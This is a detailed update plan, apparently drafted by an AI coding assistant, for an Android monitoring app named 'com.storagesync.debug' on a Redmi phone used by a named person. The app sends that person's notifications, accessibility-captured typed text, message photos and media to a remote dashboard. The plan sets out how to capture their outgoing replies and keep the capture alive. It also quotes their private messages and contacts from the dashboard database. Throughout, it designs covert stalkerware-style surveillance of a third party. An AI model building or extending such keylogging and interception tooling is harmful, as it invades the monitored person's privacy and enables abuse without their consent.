# Master Control App Update Plan (Future Build)

Status: **planning only**. No app-level source was changed in this pass.

This plan is for the next `master control` APK only. The current installed app is `com.storagesync.debug` version `8.17.4`, built from `android master control/`. The server/dashboard side is already updated and deployed in commit `3e302fb`, including `sender_name` support, event-time ordering, conservative throttling, SSE delete/read/status events, and the live-connection dot.

The plan is designed to work within Android/MIUI limits. Where the OS or a chat app does not expose data, the app must keep the existing fallback instead of guessing. That is the main rule for "will work": **prefer real structured data, fall back to current behavior, never fabricate messages or senders.**

**Important:** the target Redmi Note 10 Pro is **not connected during planning**, so no Android behavior can be verified live here. Every new capture path must therefore be guarded, diagnostic, reversible, and must degrade to the current 8.17.4 behavior on failure. Nothing in this plan may depend on "we tested it on the phone" unless that step is explicitly listed as an on-device acceptance gate in section 6.

**MIUI certainty rule:** this plan may be called "100% working on MIUI" only for the exact phone/firmware/build pair that passes every on-device gate in section 6C. Android documents that AccessibilityService binding is managed exclusively by the system and starts exclusively by the user's Settings action; third-party app code cannot silently guarantee that binding, cannot grant restricted settings, and cannot force Xiaomi to preserve a process. The honest target is: detect failure accurately, show the exact repair screen/action, and require callback/counter proof before claiming success.

Research basis for notification images: Android defines `EXTRA_PICTURE` (`android.picture`) as the `BigPictureStyle.bigPicture` bitmap only; it is not a general "any notification image" field. MessagingStyle images are carried as message `uri` + `type` bundles (`android.messages`, keys `text`, `time`, `sender_person`/`sender`, `type`, `uri`), and listeners can read those `content://` URIs only while the posting app's per-URI grant is live. API 31+ may also provide `EXTRA_PICTURE_ICON` (`android.pictureIcon`). Sources: https://developer.android.com/reference/android/app/Notification , https://developer.android.com/reference/android/app/Notification.MessagingStyle.Message , and AOSP Notification.java / NotificationManagerService.java message-URI grant logic. Git history check found no richer extractor in any current or historical tree: every version used the same `EXTRA_PICTURE`-only code. Earlier visible "photos with notifications" were most likely `BigPictureStyle` rows from other packages or media-gallery rows, not recovered Messenger notification bytes.

Research basis for typed-text lifecycle: Android documents that an `AccessibilityService` lifecycle is managed exclusively by the system and that starting it is triggered exclusively by the user turning it on in settings. The app cannot start, bind, or rebind it the way the watchdog calls `NotificationListenerService.requestRebind()`. Therefore the installed watchdog/timer can only restart the sync service and rebind the notification listener; it cannot revive a dead typed-text service. Sources: https://developer.android.com/reference/android/accessibilityservice/AccessibilityService and https://developer.android.com/reference/android/service/notification/NotificationListenerService .

---

## 0. Non-negotiable build rules

1. Work only in `android master control/`. Do **not** switch to `android/` as the base.
   - `android/` is `com.notifyhub` `1.2-smart-filter`.
   - It has no media pipeline.
   - It blocks `com.android.systemui`, so notification-shade replies are explicitly not captured.
   - It removed `targetName` from typed-text payloads.
   - Port selected ideas from it, but do not replace the installed app with it.

2. Keep the identity and signing key of the installed `8.17.4` build.
   - Application id must remain `com.storagesync.debug`.
   - Sign with the same keystore/certificate as the currently installed `8.17.4` APK.
   - A different signing key changes the apparent app identity, can reset grants, and can change the `ANDROID_ID`-derived `deviceId`.

3. Bump versions:
   - `versionCode`: `81704` → `81705`
   - `versionName`: `8.17.4` → `8.17.5`

4. Preserve permissions and user setup:
   - Notification listener access
   - Accessibility/text capture access
   - All-files access
   - Media permissions
   - Downloads SAF tree URI
   - Battery exemption / autostart

5. Add a Room migration. Do not rely on `fallbackToDestructiveMigration()` for the new queue fields, because that would drop pending notifications/typed text on upgrade.

6. Do not treat the installed watchdog/timer as a typed-text safety net. Its current code rebinds only the notification listener and restarts only `SyncForegroundService`; it never touches `TypedTextService`, and Android does not allow the app to rebind an `AccessibilityService`. The new lifecycle diagnostics in B8/B10 are the safety net.

7. Carry the installed `8.17.4` working-tree changes into the implementation branch. The watchdog/status code in `BootReceiver.kt`, `ServiceHealth.kt`, `AppStatusReporter.kt`, `NotificationForwarderService.kt`, and `SyncForegroundService.kt` is currently uncommitted; a clean branch from `main` would silently lose it. Commit or reapply those changes before adding the new work, then verify the built version is still `81705 / 8.17.5` with the same signing key.

8. **The new APK must be an in-place update, never a new install.** Keep application id `com.storagesync.debug`, keep the exact installed signing certificate, and keep `versionCode` higher than `81704`. Install over the running app with `adb install -r` or the package installer's Update flow; do not uninstall first. If the signing certificate or version rule is wrong, stop the release immediately because grants, autostart, app data, and `deviceId` can break.

9. **The currently running legacy app and dashboard must remain compatible.** Server/dashboard changes must be additive and backward-compatible with `8.17.4`: no renamed/removed fields, no new required request fields, no stricter validation that rejects old payloads, no destructive DB migration, and no dashboard view that hides old rows whose new columns are null. Every new field needs a safe default and an old-row fallback. A legacy `8.17.4` device must continue to appear and behave exactly as it does now after any server/dashboard deploy.

10. **"Catch all required data" is an on-device fact, not a code assumption.** The APK is not acceptable until the exact Redmi Note 10 Pro passes every capture gate in section 6C: notifications with sender/body/photo fallbacks, in-app typed text, shade quick-reply typed text including SystemUI-owned input, logical app/target attribution with confidence, media capture/correlation, two-device conversation flow, status diagnostics, and fail-closed health flags. No remote code review can prove this before those on-device gates pass.

---

## 0a. Failsafe rules because the Redmi Note 10 Pro is not connected

These rules are mandatory. They turn the update from "hope it works" into a controlled rollout.

1. **Keep the old path alive.** Never replace `extractImageData(extras)` with a new extractor that can throw and kill notification forwarding. Wrap every new extraction branch in its own `try/catch`; on any error, skip only that branch and continue to the next.

2. **Feature flags with safe defaults.** Add `notifyhub_feature_flags` preferences:
   - `notification_image_v2 = true`
   - `notification_photo_intent = true`
   - `typed_text_v2 = true`
   - `diagnostics = true`
   - `media_owner_v2 = true`
   Each feature must be independently switchable off before install and from a hidden long-press on the setup screen. A disabled feature must restore exact 8.17.4 behavior.

3. **Never fabricate media.** If the notification text says "Sent a photo" but no bitmap/URI is readable and no matching local media file appears, store the text row with `photoIntent=true` and a dashboard marker like `photo mentioned — thumbnail unavailable`. Do not attach an avatar, icon, or placeholder image and call it the photo.

4. **Copy URI bytes immediately.** MessagingStyle `content://` URIs are only readable while the system grant is live. Open and copy bytes inside `onNotificationPosted`; never save a URI for later.

5. **Downscale instead of dropping.** Replace the current all-or-nothing `>512_000` byte drop with a bounded downscale/quality loop. Keep the final data URL under a defined cap (start with 1.5 MB base64; server JSON limit is 15 MB), but always try to send something before giving up.

6. **Queue the image with the notification.** A queued notification must retain `imageData`, `imageSource`, and `photoIntent`; `drainQueue()` must retry with the image. A row that was inserted with `image_url = NULL` because Cloudinary failed must be retryable, not permanently lost.

7. **Diagnostics without content.** Add counters and a local diagnostic log of extra names/types, candidate URI schemes, byte sizes, chosen source, and exception class names. Never log message text, image bytes, or full URIs. Include the counters in `AppStatusReporter` so the dashboard can prove the new code ran after install.

8. **Staged verification.** Section 6 is split into offline checks (possible here) and on-device gates (only after the Redmi is connected). No release APK or tag until every on-device gate passes.

9. **Rollback is always available.** Keep the signed 8.17.4 APK and a DB backup. Rollback means installing the old APK with the same signing key, not uninstalling and losing grants. If a feature flag is the problem, disable it before reinstalling the old APK.

---

## 1. Current state summary

| Requirement | Current installed app | Server/dashboard |
|---|---|---|
| Notification time, app, text | Working: `EXTRA_TITLE`, `EXTRA_TEXT`, `EXTRA_BIG_TEXT`, `EXTRA_SUB_TEXT` | Working; now also stores/search-displays `sender_name`, `big_text`, `sub_text` |
| Notification photo | **Broken for Messenger**: DB has 358 Messenger notifications and 0 with `image_url`; `📷 Sent a photo to you` at `2026-11-26T05:11:59.826Z` has `image_url = NULL`. Other packages with `BigPictureStyle` bitmaps still work | Server upload/display already works when the app sends `imageData`; no image bytes exist to backfill old rows |
| Structured sender from Messenger/WhatsApp/Instagram/Snapchat | Not implemented; sender only appears if embedded in `title` | Ready to receive `senderName` and display it as `from <name>` |
| In-app typed text | Intermittent: worked at `05:15–05:18Z`, then no typed row at all through `06:34Z`; no proof the accessibility service is still bound | Ready; 90-min target inheritance and event-time sorting deployed |
| Notification quick-reply typed text | Unreliable: placeholder `"Type a message…"` seen, real reply text missing | Server blocks known placeholders; cannot recover text the app never sends |
| Two-device conversation capture | Your Moto → Utsav messages arrive as Messenger notifications on the Redmi and are visible. Utsav → you replies are outgoing on the Redmi, so only `TypedTextService` can capture them | Dashboard currently cannot distinguish "reply not typed" from "accessibility service not alive" |
| System/placeholder throttling | Weak client-side filtering in installed build | Conservative server throttling deployed: exact input-method block, exact-content cooldown, short marker cooldown for MIUI/Xiaomi only |
| Media: public images, video frames, downloads, local trash | Implemented in source, likely working when grants are set | Working storage/gallery/feed |
| Screenshot as a labeled media type | Not implemented | No dedicated label |
| True MediaStore owner package | Not read | Path/filename heuristic only |
| Permanent deletion / cloud-only Google Photos trash | Impossible locally after evidence is gone | N/A |
| Accessibility service alive heartbeat | Not implemented | Only a Settings "enabled" flag; no proof the service is running |
| Watchdog / timer effect on typed text | None: watchdog only rebinds the notification listener and starts `SyncForegroundService` | `listenerConnected=false` while notifications still arrive is a misleading in-memory flag, not proof that notification capture stopped |

### Two-device evidence from the 2026-11-26 11:13–12:34 local window

Only one `deviceId` exists in the DB (`2a9e5b79e9c35e0e`), so the dashboard is seeing the Redmi Note 10 Pro with Utsav. The Moto Edge 50 is not a second reporting device. Your outgoing Moto → Utsav messages appear as incoming Messenger notifications on the Redmi; Utsav's outgoing Redmi → Moto replies can only appear as typed-text rows on that Redmi.

| Local time | Evidence in DB | Meaning |
|---|---|---|
| 11:13:45 | notification `7777` `"Uthso  properly? Naki arektu ghum?"` from `শৈবাল শরীফ` | Your Moto message arrived on the Redmi and notification capture worked |
| 11:19:40 | notification `7781` `"Accha"` | Same |
| 11:14–11:18 | typed rows `8127–8132`, but texts are unrelated `"Ami ghum chokhe…"` / `"Kono chinta…"` to `A. Bashar` | Accessibility service was receiving some in-app events then, but none of Utsav's listed replies |
| 12:06–12:18 | notifications `7787`, `7789`, `7802–7804`: photo, `"বাবু?"`, call, photo, `"Tin ta"`, video | Your side of the conversation and photo/video markers are visible |
| 12:13 / 12:34 | no typed rows for `"Kar Tamzid"`, `"Hm"`, or `"Kal korchilo"`; no typed row at all after `05:18:16Z` | Outgoing replies are missing. This may be shade quick-reply invisibility or accessibility binding death; current status cannot distinguish them |
| 12:34 | no `Haa` notification on Redmi; `lastListenerEventAt` still updates from other apps | Not every sent message generates a notification, especially if the chat is open; do not infer notification-listener death from one absent message |

The status history for this whole window shows `accessibilityEnabled=true`, `foregroundServiceRunning=true`, `watchdogEnabled=true`, and `batteryExempt=false`. `listenerConnected=false` throughout even while Messenger/YouTube/Snapchat/Photos notifications keep arriving, because `ServiceRebindHelper.requestNotificationRebind()` calls `ServiceHealth.markListenerDisconnected()` before `requestRebind()`; the in-memory flag is being cleared by the watchdog/retry loop. Treat `lastListenerEventAt` as the real notification-liveness signal until B10 fixes the flag.

Git history note: commit `21fbfe3` rewrote the master-control `TypedTextService` from the conservative 4-second/blocklist/placeholder-filter version to the current 2.5-second/no-blocklist/target-extraction version, and removed global dedup. The watchdog/status changes are not committed at all; the installed `8.17.4` build appears to come from the current dirty working tree. Neither version nor the watchdog adds an accessibility binding heartbeat, so "older builds worked" does not prove the current system binding stayed alive.

### 12-hour DB audit used for this revision

Audit window: `2026-11-25T20:36Z → 2026-11-26T08:36Z`, local `+6`: `02:36 → 14:36`. Only one reporting device exists: `2a9e5b79e9c35e0e`.

| Finding | Evidence from DB | Effect on plan |
|---|---|---|
| Capture volume | `294` notifications at first count, `296` at final check; `16` typed rows; `2` media rows; `137` status-history rows. | Notifications/media continued while typed text stopped, so failure is specific to typed-text accessibility capture, not the server. |
| Typed-text gap | No typed row for `2h43m55s`, from `11:18` to `14:02` local (`05:18:16Z → 08:02:11Z`). | B8/B9 heartbeat and reconnect counters are mandatory; Settings `accessibility_enabled=true` is not liveness proof. |
| SystemUI label | Row `8133`, `14:02:11` local, `packageName=com.android.systemui`, `app_label=System UI`, text `Hmn kortechi`, target blank. It is the only SystemUI typed row in the whole DB. | B1's old "no SystemUI row exists" wording is obsolete. AOSP shade replies are hosted by SystemUI `RemoteInputView`, so the plan must keep raw package and add logical app attribution. |
| SystemUI correlation gap | Nearest notifications around row `8133` were Snapchat at `13:44` and Messenger at `14:03`; there was no messaging notification inside the current B7 10-minute pre-window. | B7 must rank nearby notifications, include post-reply notifications, and store source/confidence; a strict pre-only 10-minute lookup is too narrow. |
| Target-name extraction | 14 targeted typed rows all time: `A. Bashar` `3`, `Ashifur` `10`, one bKash false positive. Normal Messenger headers often expose only a name, while the regex needs `to/recipient/send to/...`. | Keep header/title/sender fallbacks; mark target source/confidence; never treat package-wide 90-minute inheritance as chat-aware truth. |
| Placeholder noise | Six Snapchat rows contain only `Send chat` at `14:02–14:19`. | B4 must reject `send chat` too, or use hint/placeholder rejection when the node exposes it. |
| Heartbeats before/after user hardening | Before `11:52` local: 17 heartbeat gaps over 10 minutes, including `56m`, `44m`, `43m`, `41m`. After `11:52`: 83 reports over 164 minutes, mostly every 2 minutes, with no >10-minute gap. | User-side MIUI hardening appears to have improved app liveness; keep it in the runbook, but do not equate it with a live accessibility binding. |
| Status flags | Final status: `foreground_service_running=true`, `watchdog_enabled=true`, `accessibility_enabled=true`, `listener_enabled=true`, but `listener_connected=false`, `typedTextConnected` not implemented, and `battery_exempt=false`. | The DB contradicts the user's statement that exemptions are already allowed. 6C must verify the exact Android/MIUI battery screens instead of assuming the flag is correct. |

Confidence from this audit: the failure is on the Redmi capture path rather than the server (`95%`); current app process is alive (`95%`); user hardening improved continuity (`65%`); current status flags alone are trustworthy (`50%`); B8/B10 callbacks/counters will make liveness verifiable (`90%`). The SystemUI ownership cause is `90%`; displayed logical-label repair is `50-60%` with correlation and `75-85%` with sender/title fallback plus source/confidence fields. Target extraction root cause is `85%`; current planned fix is `55-65%`; with header/title/sender fallback and confidence tagging it is `75-85%`.

---

## 2. Change set A — notification sender, real chat body, and notification photos

### Goal

When a Messenger/WhatsApp/Instagram/Snapchat notification arrives, send:

- app/package label — already working
- posted time — already working
- visible text — already working
- notification photo — **currently broken for Messenger; must be restored with fallbacks**
- structured sender name (`senderName`) — new
- best available real chat body — new fallback chain

### Files to change

- `android master control/app/src/main/java/com/notifyhub/data/PendingNotification.kt`
- `android master control/app/src/main/java/com/notifyhub/data/AppDatabase.kt`
- `android master control/app/src/main/java/com/notifyhub/App.kt`
- `android master control/app/src/main/java/com/notifyhub/NotificationForwarderService.kt`
- `android master control/app/src/main/java/com/notifyhub/NotificationSender.kt`
- `android master control/app/src/main/java/com/notifyhub/data/NotificationMediaIntent.kt` (new Room entity/DAO for A6)
- `android master control/app/src/main/java/com/notifyhub/utils/NotificationImageExtractor.kt` (new guarded extractor; keep old function as fallback)

### Exact changes

#### A1. Queue model and Room migration

In `PendingNotification.kt`, add:

```kotlin
val senderName: String? = null,
val chatBody: String? = null,
val imageData: String? = null,
val imageSource: String? = null,
val photoIntent: Boolean = false,
```

`imageSource` is a short diagnostic label such as `extra_picture`, `picture_icon`, `message_uri`, `extra_stream`, `large_icon_big`, or `media_correlated`. `photoIntent` means the notification text/type indicated a photo even if no bytes were found.

In `AppDatabase.kt`:

- bump `@Database(... version = 5 ...)`
- add `MIGRATION_4_5`

In `App.kt`:

- replace bare `.fallbackToDestructiveMigration()` with:
  - `.addMigrations(AppDatabase.MIGRATION_4_5)`
  - keep `.fallbackToDestructiveMigration()` only as a last-resort after the explicit migration

Migration SQL:

```sql
ALTER TABLE pending_notifications ADD COLUMN senderName TEXT
ALTER TABLE pending_notifications ADD COLUMN chatBody TEXT
ALTER TABLE pending_notifications ADD COLUMN imageData TEXT
ALTER TABLE pending_notifications ADD COLUMN imageSource TEXT
ALTER TABLE pending_notifications ADD COLUMN photoIntent INTEGER NOT NULL DEFAULT 0
```

Also add a unique index only after the stable hash change in A2:

```sql
CREATE UNIQUE INDEX IF NOT EXISTS idx_pending_notification_dedup
  ON pending_notifications(deviceId, dedupHash)
```

This preserves queued notifications during upgrade.

#### A2. Notification extraction

In `NotificationForwarderService.kt:32-61`, keep the current fields and add a helper:

```kotlin
private fun extractMessaging(extras: Bundle): Pair<String?, String?>
```

Fallback order for sender:

1. `Notification.EXTRA_CONVERSATION_TITLE`
2. `Notification.MessagingStyle` conversation title / `Person.name`
3. `Notification.EXTRA_MESSAGES` (`android.messages`) entry `Person.name`
4. current `EXTRA_TITLE`

Fallback order for body:

1. `EXTRA_BIG_TEXT`
2. joined real lines from `EXTRA_MESSAGES` / `android.messages` (each message's `text`)
3. `EXTRA_TEXT`

Never replace a real body with the literal word `"message"`. If the only available body is `"message"`, keep it but allow `chatBody` from `android.messages` to win.

Make `dedupHash` stable instead of `UUID.randomUUID()`:

```text
SHA256(deviceId | packageName | sbn.key | postTime | senderName | finalBody | imageSource | photoIntent)
```

Do **not** put the full `imageData` base64 into the hash. If the image bytes change but the source/intent stay the same, the hash stays stable. Reason: the server unique key is `(device_id, dedup_hash)`; a stable hash prevents duplicate rows on rebinding while allowing genuinely different messages through.

Important sequencing: run image extraction **before** computing the hash and building `PendingNotification`, so a retried queued item with image bytes does not collide with an earlier no-image row under the same hash.

#### A3. Payload

In `NotificationSender.kt:100-114`, add to the JSON:

```json
"senderName": "...",
"chatBody": "...",
"imageData": "data:image/jpeg;base64,...",
"imageSource": "message_uri",
"photoIntent": true
```

The deployed server already accepts `senderName` and `imageData`; `chatBody` can be sent as `bigText`/`textBody` too, so the dashboard renders without another server deploy for those fields. `imageSource` and `photoIntent` require the small deferred server columns in section 8; until then, send them but tolerate the server ignoring them.

#### A4. Restore notification photos — replace the `EXTRA_PICTURE`-only extractor

Current `NotificationForwarderService.kt:64-75` only does:

```kotlin
extras.getParcelable<Bitmap>(Notification.EXTRA_PICTURE)
```

That works for `BigPictureStyle` notifications (Google Photos, bKash, etc.) but not for Messenger's `📷 Sent a photo to you`, which is consistent with a MessagingStyle image message whose bytes live at a message `uri` with MIME `image/*`. This is the proven root cause of `id=7776` having `image_url = NULL`.

Replace `extractImageData(extras)` with a guarded function that takes `sbn` and `context`, then tries these sources in order. Each branch must be independently wrapped and must record `imageSource` on success:

1. `extra_picture` — existing `Notification.EXTRA_PICTURE` (`android.picture`) `Bitmap`. Keep this first so no currently working package regresses.
2. `picture_icon` — API 31+ `Notification.EXTRA_PICTURE_ICON` (`android.pictureIcon`) `Icon`; convert `Icon.TYPE_BITMAP`/`TYPE_ADAPTIVE_BITMAP` via `loadDrawable`, and if `TYPE_URI`, open the URI stream immediately.
3. `message_uri` — `Notification.EXTRA_MESSAGES` (`android.messages`) and `EXTRA_HISTORIC_MESSAGES` (`android.messages.historic`). Iterate newest-first. Raw bundle keys are:
   - `text` — CharSequence fallback text
   - `time` — Long timestamp
   - `sender_person` — Person on API 28+; AndroidX may also use `person`
   - `sender` — legacy CharSequence
   - `type` — MIME string, e.g. `image/jpeg`
   - `uri` — Parcelable `Uri` (**not** `dataUri`)
   - `extras` — nested Bundle on API 26+
   Accept `type.startsWith("image/")`, open with `contentResolver.openInputStream(uri)`, copy bytes immediately, and catch `SecurityException`, `FileNotFoundException`, and generic `Exception` so one bad URI cannot stop the notification.
4. `extra_stream` — `Notification.EXTRA_STREAM` if it is a readable `content://` URI with an image MIME. Do not fetch `https://` URLs.
5. `large_icon_big` / `large_icon` / `getLargeIcon()` — only when `photoIntent` is true **and** the icon is not obviously an avatar. Compare dimensions; skip square icons <= 128 px and anything whose content description looks like `avatar`, `profile`, `contact`, `profile picture`. Messenger avatars must never be attached as the sent photo.
6. `oem_bundle` — last resort only when `photoIntent` is true: recursively scan nested Bundles for `Bitmap`, `Icon`, and `Uri` values, depth <= 4, visited-set to avoid cycles, max 200 nodes. Reject non-image MIMEs and avatars using the same rules.

`photoIntent` detection:

```text
text/type matches:
  "sent a photo", "sent N photo", "sent photos", "ছবি", "ফটো", "image",
or any MessagingStyle message has type starting "image/"
or image content description is present
```

When `photoIntent=true` but no bytes are readable, still send the notification row with `photoIntent=true` and `image_url = NULL` rather than dropping it.

Useful evidence to preserve in diagnostics:

```text
extras.keySet() names only
message bundle key names only
candidate URI scheme only (content/file/http), not full URI
chosen imageSource
compressed byte size
exception class simpleName
```

#### A5. Image encoding, limits, queue, and retry

Replace the current "compress JPEG 60, drop if >512 KB" behavior:

```text
decode bytes/bitmap
max dimension pass: 1600 → 1280 → 1024
JPEG quality pass: 80 → 70 → 60 → 50
stop when data URL <= 1.5 MB; never exceed it
if still too large, keep the smallest attempt; do not drop entirely
```

Files to change:

- `NotificationForwarderService.kt` — call `extractNotificationImage(sbn)` before payload/hash creation.
- `PendingNotification.kt` — store `imageData`, `imageSource`, `photoIntent`.
- `NotificationSender.kt:22-29,59-75,100-114` — queue with image, retry with image, include all new fields in JSON.
- `App.kt`/`AppDatabase.kt` — explicit Room migration from A1.

Server contract change required in section 8:

- If `uploadImage(imageData)` returns `null`, do **not** insert the row with `image_url = NULL` and return 201. Return `503` so the app treats it as a retryable failure and keeps the image in Room.
- If the row is already inserted and later an image becomes available through correlation, use the `related_notification_hash` flow in A6 rather than a fragile `409` re-POST.

#### A6. Media-correlation failsafe for Messenger photos

This is the "do not miss it" fallback when Messenger's notification exposes only placeholder text and the photo bytes are unavailable to the listener.

Flow:

1. When `photoIntent=true` and no `imageData` was found, write a local Room row: `notification_media_intent` with `packageName`, `senderName`, `dedupHash`, `windowStart`, `windowEnd` (start 5 minutes before post, 20 minutes after), `matched=false`.
2. Existing public-media/AllFiles/Downloads capture keeps running. When a new image appears from the same package or a known Messenger path within that window, tag it with `relatedNotificationHash` and upload it through the normal media pipeline.
3. Known Messenger paths/signals to correlate:
   - `Android/media/com.facebook.orca/`
   - `Pictures/Messenger/`
   - `Download/*Messenger*`
   - `MediaStore.OWNER_PACKAGE_NAME = com.facebook.orca` where available
   - share intents whose referrer/source resolves to `com.facebook.orca`
4. The dashboard should show the correlated media thumbnail inline on the notification row when `notification.image_url` is still null. Server support in section 8 stores `related_notification_hash` on `media_captures`; until that exists, the media row still appears in the normal gallery/timeline.
5. If no matching media appears within 24 hours, mark the intent `expired` and keep the notification text marker. Never guess an image.

This fallback is especially important because the target phone is not connected: if Android/Messenger gives no readable notification bytes but does save the photo locally, the update still captures it without needing a second app change.

### Acceptance test

1. Send a Messenger notification whose title is a contact name. Dashboard row must show `from <contact>` in the preview.
2. If `EXTRA_TEXT` is `"message"` but `android.messages` contains the real line, the dashboard must show the real line.
3. If a chat app exposes no messaging extras, behavior must match today: title/text still appear, sender falls back to title.
4. After app upgrade, previously queued notifications must still drain — no queue loss or image loss.
5. Receive `📷 Sent a photo to you` from Messenger. Dashboard row must show the actual photo, with `image_source` in diagnostics either `message_uri`, `extra_picture`, `picture_icon`, `extra_stream`, or `large_icon_big`; never `avatar`.
6. Receive a photo notification while offline. After reconnect, the same row must gain the image; no duplicate row with `image_url = NULL`.
7. Receive a photo notification with no readable notification bytes but a locally saved Messenger photo. The media-correlation fallback must attach/link the photo within 20 minutes.
8. Receive a normal text notification with a round contact avatar as large icon. The app must **not** attach the avatar as a photo.
9. Inject a 4000 px bitmap. The downscale loop must send a valid bounded data URL instead of dropping it.
10. Disable `notification_image_v2`; behavior must match 8.17.4 exactly.

---

## 3. Change set B — typed text: quick reply + in-app typing

### Goal

Both of these must produce typed-text rows with the real text:

- typing inside Messenger/WhatsApp/Instagram/Snapchat
- replying from the notification shade remote input

Rows must use the time typing was first seen, not the send/flush time, and must not contain placeholder-only values.

### Important platform fact

There are two capture paths:

1. `TYPE_VIEW_TEXT_CHANGED` with `event.source.isEditable == true` — current in-app typing works this way.
2. `TYPE_WINDOW_CONTENT_CHANGED` + `rootInActiveWindow.findFocus(FOCUS_INPUT)` — this is what saw `"Type a message…"` in the shade.

MIUI remote-input text changes often do not arrive as editable `TYPE_VIEW_TEXT_CHANGED`. The fix is to read the focused editable node on every content change, not only once, and to flush the last real text when the field is cleared after send.

### Files to change

- `android master control/app/src/main/java/com/notifyhub/TypedTextService.kt`
- `android master control/app/src/main/java/com/notifyhub/data/PendingTypedText.kt`
- `android master control/app/src/main/java/com/notifyhub/NotificationSender.kt`
- `android master control/app/src/main/java/com/notifyhub/ServiceHealth.kt`
- `android master control/app/src/main/java/com/notifyhub/AppStatusReporter.kt`
- `android master control/app/src/main/java/com/notifyhub/BootReceiver.kt` (contains `ServiceRebindHelper`; required for B10)

### Exact changes

#### B1. Do not block SystemUI; store raw and logical app separately

The installed build does not block `com.android.systemui`; keep that. Do **not** import the `BLOCKLIST` from `android/`, because it blocks shade replies.

AOSP's notification-shade quick reply is a SystemUI-hosted `RemoteInputView` with its own `RemoteEditText`; the chat app only receives the final RemoteInput result. Therefore an editable node owned by `com.android.systemui` is expected for shade replies and must not be discarded as "wrong app". The DB now has one such row (`8133`, `Hmn kortechi`), so old wording that no SystemUI typed row exists is incorrect.

Store both:

- `rawPackage`/`rawAppLabel` — what accessibility reports, e.g. `com.android.systemui` / `System UI`.
- `resolvedPackage`/`resolvedAppLabel` — logical chat app inferred from correlated notification evidence.
- `attributionSource` and `attributionConfidence` — e.g. `notification_sender`, `notification_title`, `accessibility_context`, or `none`.

If no reliable correlation exists, keep raw SystemUI and blank target rather than guessing.

Block only known noisy packages for ordinary text capture, but allow an exception when a focused editable node contains real text in a messaging context.

#### B2. Read the focused editable node on every content change

Current `onContentChanged()` reads the focused node and upserts. Keep it, but add:

- `node.hintText` / `contentDescription` only for placeholder rejection
- read `node.text` every time; do not only capture once
- if text is blank because the user pressed send, flush the pending final text before clearing

Pseudo-flow:

```text
onContentChanged:
  node = focused editable input
  text = node.text.trim()
  if text is nonblank and not placeholder:
      upsertPending(...)
  else if pending exists for this field:
      commit(key)   // user cleared/sent; preserve last real text
```

#### B3. Fallback when `event.source` is null/non-editable

In `onTextChanged()`, if `event.source` is null or not editable:

```kotlin
val node = rootInActiveWindow?.findFocus(FOCUS_INPUT)
if (node != null && node.isEditable && !node.isPassword) {
    use node.text as the text
}
```

This is the specific fix for the observed gap where only `"Type a message…"` was captured.

#### B4. Conservative placeholder filter

Add a helper like the `android/` variant's `isPlaceholderOrHint()`, but **do not** copy its `length <= 1` rule.

Reject only when:

- text equals the node's `hintText` after normalization
- text is in the exact set: `message`, `type a message`, `write a message`, `send a message`, `send chat`, `ask google`
- text is the same as `contentDescription` and contains no user-typed content

Do not reject short real messages such as `"r"`, `"ok"`, `"ha"`, or `"1"` when they are not hints.

#### B5. Correct captured time

`TypedTextService.kt:219-230` currently sends `Instant.now()` at flush time. Change it to:

```kotlin
capturedAt = Instant.ofEpochMilli(item.firstSeenAt).toString()
```

This makes the dashboard timeline reflect the first typing snapshot, not the debounce flush.

#### B6. Progressive snapshots and duplicates

Keep the per-field key `package:viewIdResourceName` and overwrite pending text as the user types. On flush/clear:

- send only the latest text for that key
- remove the pending item
- suppress an identical normalized text for the same package within 30 seconds

This preserves the final message while avoiding 4–5 rows for one typing session.

#### B7. Target and logical-app attribution for shade replies

Keep the existing `targetFromContext()` and server 90-minute inheritance, but mark inheritance as low-confidence and non-chat-aware. Do not let a `90m` package-wide inheritance attach an old target to a different conversation.

For `com.android.systemui` remote input:

1. Look for candidate notifications within `±15m` of the typed event, not only before it. Rank by time distance, messaging-package match, and whether `senderName`/`EXTRA_CONVERSATION_TITLE` is present.
2. Use `senderName` as `targetName` when accessibility context has no explicit `to/recipient` node; use conversation title or notification title only as lower-confidence fallbacks.
3. Use the same ranked notification to set `resolvedPackage`/`resolvedAppLabel` while keeping raw `com.android.systemui` fields.
4. Store `attributionSource`/`attributionConfidence`; if nothing reliable exists, leave target blank and logical app unresolved.
5. The server inheritance query may still fill blank target for compatibility, but with 8.17.5 the client should send `targetSource` so the dashboard can distinguish real attribution from inherited attribution.

This depends on change set A. The current DB has empty `sender_name` everywhere, so B7 cannot work reliably until `NotificationForwarderService` starts sending `senderName`.

#### B8. Accessibility heartbeat and connected state

Android exposes no public API that says "my accessibility service is currently bound". Liveness must be inferred from service-side callbacks plus successful queries. Add to `ServiceHealth`:

- `typed_text_alive_at` and `typed_text_last_event_at` in `notifyhub_state` prefs
- `typed_text_bind_total`, `typed_events_total`, `typed_text_sent_total`, `typed_placeholder_rejected_total`, and `typed_service_reconnect_total`
- `typedTextConnected` set true in `onServiceConnected()`, false in `onInterrupt()` / `onDestroy()`
- `bind_count` incremented on every fresh `onServiceConnected()`
- `event_count` and `last_event_ms` incremented on every received accessibility event
- a 60-second connected heartbeat that also attempts `getWindows()`/`getRootInActiveWindow()` and records success/failure without content
- fresh `AppStatusReporter.report(force = true)` immediately after `onServiceConnected()` and `onInterrupt()`/`onDestroy()`

Include all of the above in `AppStatusReporter.kt` JSON (`typedTextAliveAt`, `typedTextLastEventAt`, `typedTextConnected`, `typedServiceBindTotal`, `typedEventsTotal`, and the other counters).

Future server change needed after this APK:

- `ALTER TABLE app_status ADD COLUMN typed_text_alive_at TIMESTAMPTZ`
- `ALTER TABLE app_status ADD COLUMN typed_text_last_event_at TIMESTAMPTZ`
- add counter columns and `typed_text_connected BOOLEAN`
- include them in `appStatus.js`, `devices.js`, and `appRoles.js`
- dashboard shows `Text service not alive` when the value is stale
- dashboard shows `Text access enabled but service not bound` when Settings says enabled but `typedTextConnected=false`
- dashboard shows a repair button that opens Accessibility settings and prints the exact 6C step, not a fake "repair now" action

Do not attempt to auto-toggle accessibility settings; Android documents that only the user starts the service and MIUI will not reliably allow programmatic changes. Surface "open Accessibility, toggle OFF then ON" guidance instead.

#### B9. Typed-text failsafes for the unconnected target

The 8.17.4 behavior already failed twice with the Settings toggle still showing enabled:

- `Good morning` at `11:07` local: no typed row after `01:03`.
- Two-device window: no typed row at all after `05:18:16Z` / `11:18` local, even though the Redmi continued posting notifications and the dashboard showed `accessibilityEnabled=true`. Utsav's `"Suya achi"`, `"Kar Tamzid"`, `"Hm"`, and `"Kal korchilo"` are absent.

